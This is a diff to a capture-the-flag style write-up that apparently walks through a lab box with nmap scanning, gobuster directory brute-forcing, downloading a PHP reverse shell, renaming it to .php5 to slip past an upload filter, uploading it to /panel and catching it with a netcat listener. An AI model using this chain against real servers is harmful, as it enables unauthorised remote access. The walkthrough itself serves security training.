@@ -4,9 +4,11 @@
 **TOOLS USED**: nmap, gobuster, netcat
 
 **nmap**: network exploration tool and security / port scanner<br>
+
 ```
 nmap [Scan Type...] [Options] {target specification}
 ```
+
 Scan Types:<br>
 -Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
 -St TCP Scan (Opens full TCP connection)<br>
@@ -24,6 +26,7 @@ gobuster [command]
 nc [-options] hostname port[s] [ports] ...
 nc -l -p port [-options] [hostname] [port]
 ```
+
 --------------------------------------------------------------------
 ## GIVEN INFO
 
@@ -51,7 +54,7 @@ nmap -sV -oN nmap.txt 10.10.142.72
 
 --------------------------------------------------------------------
 
-### 2. FIND HIDDEN DIR On WEB SERVER
+### 2. FIND HIDDEN DIR ON WEB SERVER
 
 **TOOLS**: gobuster
 
@@ -60,7 +63,7 @@ gobuster dir -u http://10.10.142.72 -w /usr/share/wordlists/dirb/common.txt
 ```
 dir: directory brute force<br>
 -u: website<br>
--w: wordlist 
+-w: wordlist
 
 ![gobuster](./imgs/gobuster.png)
 
@@ -76,7 +79,7 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 mv php-reverse-shell.php payload.php5
 ```
 
-Change IP address to your IP address and upload file
+Change IP address to your IP address and upload file to http://10.10.142.72/panel
 
 ```
 nc -nlvp 4444
